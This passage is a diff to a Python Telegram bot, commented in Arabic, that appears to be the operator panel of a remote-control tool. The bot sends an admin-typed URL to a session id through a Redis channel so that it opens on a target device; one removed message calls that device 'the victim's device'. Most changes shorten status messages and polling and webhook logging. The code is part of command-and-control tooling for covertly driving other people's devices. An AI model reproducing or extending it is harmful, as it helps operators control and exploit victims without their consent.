-        bot.send_message(message.chat.id, f"✅ تم الإرسال إلى `{uid}`", parse_mode="Markdown")
+        bot.send_message(uid, f"📨 **من الإدارة:**\n\n{message.text}", parse_mode="Markdown")
+        bot.send_message(message.chat.id, f"✅ تم الإرسال", parse_mode="Markdown")
     except Exception as e:
-        bot.send_message(message.chat.id, f"❌ فشل الإرسال: {e}")
+        bot.send_message(message.chat.id, f"❌ {e}")
 
 
 # ============================================================
-# معالجة الرابط المُدخل
+# معالجة الرابط المُدخل (LSH)
 # ============================================================
 _pending_open_url = {}
 
@@ -1506,10 +1386,7 @@ def handle_open_url(message):
     sid = _pending_open_url.pop(message.chat.id, None)
     if sid:
         ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
-        if ok:
-            bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثانيتين")
-        else:
-            bot.send_message(message.chat.id, "❌ **فشل الإرسال** — تحقق من اتصال Redis")
+        bot.send_message(message.chat.id, "✅ تم الإرسال" if ok else "❌ فشل")
 
 
 # ============================================================
@@ -1527,27 +1404,15 @@ def run_telegram_bot():
             params={"drop_pending_updates": "true"},
             timeout=15,
         )
-        print(f"[+] deleteWebhook HTTP {r.status_code}: {r.text[:200]}")
+        print(f"[+] deleteWebhook HTTP {r.status_code}")
     except Exception as e:
-        print(f"[-] deleteWebhook HTTP error: {e}")
+        print(f"[-] deleteWebhook: {e}")
 
     try:
-        r = requests.get(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo",
-            timeout=15,
-        )
-        print(f"[+] getWebhookInfo: {r.text[:300]}")
-    except Exception as e:
-        print(f"[-] getWebhookInfo error: {e}")
-
-    try:
-        r = requests.get(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
-            timeout=15,
-        )
+        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
         print(f"[+] getMe: {r.text[:200]}")
     except Exception as e:
-        print(f"[-] getMe error: {e}")
+        print(f"[-] getMe: {e}")
 
     print("[+] Starting infinity_polling loop...")
     attempt = 0
@@ -1555,22 +1420,15 @@ def run_telegram_bot():
         try:
             attempt += 1
             print(f"[+] Polling attempt #{attempt}")
-            bot.infinity_polling(
-                skip_pending=True,
-                timeout=30,
-                long_polling_timeout=30,
-                none_stop=True,
-            )
+            bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30, none_stop=True)
         except Exception as e:
             print(f"[-] Polling crashed: {e}")
-            print(f"[+] Restarting in 5 seconds...")
             time.sleep(5)
 
 
 if __name__ == "__main__":
     bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
     bot_thread.start()
-
     time.sleep(2)
 
     port = int(os.environ.get("PORT", 8080))
